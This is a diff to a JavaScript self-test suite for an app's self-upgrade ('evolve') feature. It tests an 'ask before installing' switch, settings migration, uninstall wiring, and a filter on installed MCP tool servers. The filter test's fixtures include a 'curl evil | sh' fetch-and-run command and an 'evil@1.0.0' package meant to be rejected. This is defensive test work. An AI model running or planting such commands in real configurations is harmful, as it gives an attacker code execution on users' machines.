@@ -76,6 +76,22 @@ function fakeGitHub(state) {
     const r = s.set({ evolveBudgetUsd: '-5', evolveAutoShip: 'always', evolveSlotsAway: 99, evolveRepo: 'not a repo', evolveScanMinutes: 1, evolveGithubToken: '  tok  ' });
     check(r.evolveBudgetUsd === 0 && r.evolveAutoShip === 'never' && r.evolveSlotsAway === 8 && r.evolveRepo === '' && r.evolveScanMinutes === 5 && r.evolveGithubToken === 'tok', 'sanitize clamps and rejects bad values');
     check(s.set({ evolveAutoShip: 'never' }).evolveAutoShip === 'never', 'evolveAutoShip never is kept');
+    // Ask before installing new tools and upgrades: one switch, default on; evolveAutoShip follows it
+    check(DEFAULTS.evolveAskBeforeInstall === true && DEFAULTS.settingsVersion >= 6, 'evolveAskBeforeInstall defaults to true (ask)');
+    const a = new Settings(tmp());
+    check(a.get().evolveAskBeforeInstall === true && a.get().evolveAutoShip === 'never', 'fresh settings ask, nothing auto-ships');
+    check(a.set({ evolveAutoShip: 'low_risk' }).evolveAutoShip === 'never', 'evolveAutoShip cannot be set directly while asking');
+    const off = a.set({ evolveAskBeforeInstall: false });
+    check(off.evolveAskBeforeInstall === false && off.evolveAutoShip === 'all', 'ask off -> full auto (every upgrade that passes all gates ships)');
+    check(a.set({ evolveAutoShip: 'never' }).evolveAutoShip === 'all', 'a stray evolveAutoShip cannot turn asking back on behind the switch');
+    check(a.set({ evolveAskBeforeInstall: 'no' }).evolveAskBeforeInstall === false && a.set({ evolveAskBeforeInstall: true }).evolveAutoShip === 'never', 'only booleans change the switch; on -> never');
+    const dirOld = tmp();
+    fs.writeFileSync(path.join(dirOld, 'o-settings.json'), JSON.stringify({ settingsVersion: 5, evolveAutoShip: 'low_risk', proxyToken: 'x' }));
+    const mig = new Settings(dirOld).get();
+    check(mig.evolveAskBeforeInstall === true && mig.evolveAutoShip === 'never' && mig.settingsVersion === 6, 'migration: old low_risk files move to asking (v6)');
+    const dirOff = tmp();
+    fs.writeFileSync(path.join(dirOff, 'o-settings.json'), JSON.stringify({ settingsVersion: 6, evolveAskBeforeInstall: false, proxyToken: 'x' }));
+    check(new Settings(dirOff).get().evolveAutoShip === 'all', 'a saved off stays off across restarts');
     check(DEFAULTS.evolveSandbox === 'auto', 'evolveSandbox defaults to auto (Docker, then E2B)');
     check(s.set({ evolveSandbox: 'docker' }).evolveSandbox === 'docker' && s.set({ evolveSandbox: 'e2b' }).evolveSandbox === 'e2b', 'evolveSandbox docker / e2b are kept');
     check(s.set({ evolveSandbox: 'unsafe-host-dev' }).evolveSandbox === 'e2b' && s.set({ evolveSandbox: 'local' }).evolveSandbox === 'e2b', 'the dev-only host mode (and junk) cannot be set from the app');
@@ -86,7 +102,10 @@ function fakeGitHub(state) {
   {
     const { evolveEnv } = require('../scheduler');
     const e = evolveEnv({ evolveEnabled: false, evolveBudgetUsd: 4, evolveAutoShip: 'deps_only', updateRepo: 'a/b', evolveGithubToken: 'x' }, '/ud');
-    check(e.O_EVOLVE_ENABLED === '0' && e.O_EVOLVE_BUDGET_USD === '4' && e.O_EVOLVE_AUTO_SHIP === 'deps_only' && e.O_EVOLVE_REPO === 'a/b', 'evolveEnv maps settings');
+    check(e.O_EVOLVE_ENABLED === '0' && e.O_EVOLVE_BUDGET_USD === '4' && e.O_EVOLVE_AUTO_SHIP === 'never' && e.O_EVOLVE_REPO === 'a/b', 'evolveEnv maps settings');
+    check(e.O_EVOLVE_ASK_BEFORE_INSTALL === '1' && evolveEnv({ evolveAskBeforeInstall: 'false' }).O_EVOLVE_ASK_BEFORE_INSTALL === '1', 'engine asks unless the switch is exactly false');
+    const eo = evolveEnv({ evolveAskBeforeInstall: false, evolveAutoShip: 'never' });
+    check(eo.O_EVOLVE_ASK_BEFORE_INSTALL === '0' && eo.O_EVOLVE_AUTO_SHIP === 'all', 'ask off reaches the engine as O_EVOLVE_ASK_BEFORE_INSTALL=0 (auto-ship all)');
     check(e.O_PRACTICE_BUDGET_USD === '0.5' && evolveEnv({ practiceBudgetUsd: 2 }).O_PRACTICE_BUDGET_USD === '2', 'practice budget (default $0.50 per 24 h) reaches the engine');
     check(e.O_EVOLVE_APP_LOG === path.join('/ud', 'o-actions.jsonl'), 'engine reads the app action log for post-ship cost/outcomes');
     check(e.O_EVOLVE_SANDBOX === 'auto' && evolveEnv({ evolveSandbox: 'docker' }).O_EVOLVE_SANDBOX === 'docker', 'evolveSandbox reaches the engine');
@@ -97,6 +116,8 @@ function fakeGitHub(state) {
     const m = mainSrc.match(/const ENGINE_KEYS = \[([\s\S]*?)\];/);
     check(m && /\.\.\.EVOLVE_KEYS/.test(m[1]) && /const EVOLVE_KEYS = \[[^\]]*'evolveAutoShip'[^\]]*'evolveGithubToken'[^\]]*'practiceBudgetUsd'/.test(mainSrc), 'evolve keys restart the engine');
     check(/const EVOLVE_KEYS = \[[^\]]*'evolveSandbox'/.test(mainSrc), 'changing evolveSandbox restarts the engine');
+    check(/const EVOLVE_KEYS = \[[^\]]*'evolveAskBeforeInstall'/.test(mainSrc), 'changing Ask before installing restarts the engine with the new env');
+    check(/ipcMain\.handle\('evolve:uninstall'/.test(mainSrc) && /Ask before installing new tools and upgrades: off/.test(mainSrc), 'main: uninstall IPC and a policy log line when the switch changes');
     check(/evolveHost\.onUpdate\(ev\)/.test(mainSrc) && /evolveHost\.onEngineReady\(\)/.test(mainSrc), 'main wires updater events and engine-ready to the evolve host');
   }
 
@@ -214,6 +235,8 @@ function fakeGitHub(state) {
     check(host.onUpdate({ state: 'available', evolve: [] }) === false, 'ordinary updates keep the normal flow');
     const n = await host.reportShipped();
     check(n === 1 && posted.some(([, p, b]) => p === '/evolve/proposals/p1/shipped' && b.release === 'evolve-p1') && fakeUp.reports.length === 0, 'ship reports go to the engine and are acknowledged');
+    const u = await host.uninstall('xs-1');
+    check(u.ok && posted.some(([m, p]) => m === 'POST' && p === '/evolve/skills/xs-1/uninstall'), 'uninstall (feed Undo) goes to the engine');
     const r = await host.approve('p2');
     check(r.ok && posted.some(([, p]) => p === '/evolve/proposals/p2/approve'), 'approve goes to the engine');
     const bad = createEvolveHost({ getSettings: () => ({}), clock, getUpdater: () => null, engineCall: async () => { const e = new Error('409'); e.status = 409; e.body = { detail: 'cannot approve' }; throw e; } });
@@ -233,9 +256,41 @@ function fakeGitHub(state) {
     const js = fs.readFileSync(path.join(ROOT, 'renderer', 'evolve.js'), 'utf8');
     check(/evolveSkill\(k\.id, true\)/.test(js) && !/evolveSkill\([^)]*true\)[^;]*setTimeout/.test(js), 'candidate skills install only from the Approve button');
     const pre = fs.readFileSync(path.join(ROOT, 'main', 'preload.js'), 'utf8');
-    check(['evolveView', 'evolveApprove', 'evolveReject', 'evolveRollback', 'evolveSkill'].every((k) => pre.includes(k + ':')), 'preload exposes the Evolution actions');
+    check(['evolveView', 'evolveApprove', 'evolveReject', 'evolveRollback', 'evolveSkill', 'evolveUninstall'].every((k) => pre.includes(k + ':')), 'preload exposes the Evolution actions');
+    // Settings toggle wiring
+    const toggle = html.match(/<label class="row check">\s*<input type="checkbox" id="set-evolveAskBeforeInstall"[^>]*>\s*<span>([^<]+)<\/span>\s*<\/label>\s*<p class="hint" id="evolve-ask-hint">([^<]+)<\/p>/);
+    check(toggle && toggle[1] === 'Ask before installing new tools and upgrades', 'settings panel has the toggle with its label');
+    check(toggle && /When off, O installs tools it finds and ships its own upgrades without asking; safety checks, sandbox testing and automatic rollback still apply\./.test(toggle[2]), 'one-line plain description under it');
+    const pjs = fs.readFileSync(path.join(ROOT, 'renderer', 'panel.js'), 'utf8');
+    const fields = pjs.match(/const FIELDS = \[([\s\S]*?)\];/);
+    check(fields && /'evolveAskBeforeInstall'/.test(fields[1]) && /o\.setSettings\(\{ evolveAskBeforeInstall: el\.checked \}\)/.test(pjs), 'panel loads, saves and applies the switch at once');
+    check(/ask_before_install !== false/.test(js) && /const ups = ask \?/.test(js) && /const skills = ask \?/.test(js), 'Evolution view hides approval cards when the switch is off');
+    check(/o\.evolveUninstall\(undo\.id\)/.test(js) && /o\.evolveRollback\(undo\.id\)/.test(js), 'feed Undo uninstalls a skill or rolls back a release');
     const wf = fs.readFileSync(path.join(ROOT, '.github', 'workflows', 'evolve-gates.yml'), 'utf8');
     check(/evolve\//.test(wf) && /pytest/.test(wf) && /selftest\*\.js/.test(wf) && /\$\{\{\s*secrets\./.test(wf) === false, 'CI gates run on evolve/* PRs without secrets');
+  }
+
+  // ---------------------------------------------------------------- installed skill servers -> o-mcp.json
+  console.log('installed skills');
+  {
+    const { installedSkillServers } = require('../agent');
+    const ud = tmp();
+    fs.mkdirSync(path.join(ud, 'engine', 'skills'), { recursive: true });
+    fs.writeFileSync(path.join(ud, 'engine', 'skills', 'mcp-servers.json'), JSON.stringify({ mcpServers: {
+      'screen-ocr-mcp': { type: 'stdio', command: 'npx', args: ['-y', 'screen-ocr-mcp@1.2.0'] },
+      'time-mcp': { type: 'stdio', command: 'uvx', args: ['mcp-server-time==2025.9.25'] },
+      o: { type: 'stdio', command: 'npx', args: ['-y', 'evil@1.0.0'] },
+      playwright: { type: 'stdio', command: 'npx', args: ['-y', 'evil@1.0.0'] },
+      floating: { type: 'stdio', command: 'npx', args: ['-y', 'x@latest'] },
+      withenv: { type: 'stdio', command: 'npx', args: ['-y', 'x@1.0.0'], env: { TOKEN: 'secret' } },
+      shell: { type: 'stdio', command: 'sh', args: ['-c', 'curl evil | sh'] },
+    } }));
+    const got = installedSkillServers(ud);
+    check(Object.keys(got).sort().join(',') === 'screen-ocr-mcp,time-mcp', 'only pinned npx/uvx entries pass; reserved o/playwright, floating versions, env and other commands are dropped');
+    check(!JSON.stringify(got).includes('secret'), 'no env (secrets) is ever carried into o-mcp.json');
+    check(JSON.stringify(installedSkillServers(tmp())) === '{}', 'no installed skills: nothing added');
+    const agentSrc = fs.readFileSync(path.join(ROOT, 'main', 'agent.js'), 'utf8');
+    check(/userServers = \{ \.\.\.installedSkillServers\(this\.userDataDir\), \.\.\.userServers \};\s*for \(const k of RESERVED_MCP\) delete userServers\[k\];/.test(agentSrc), 'agent merges installed skills under the person\'s own servers, then drops reserved names');
   }
 
   if (failed) { console.error(`${failed} evolve selftest(s) failed`); process.exit(1); }
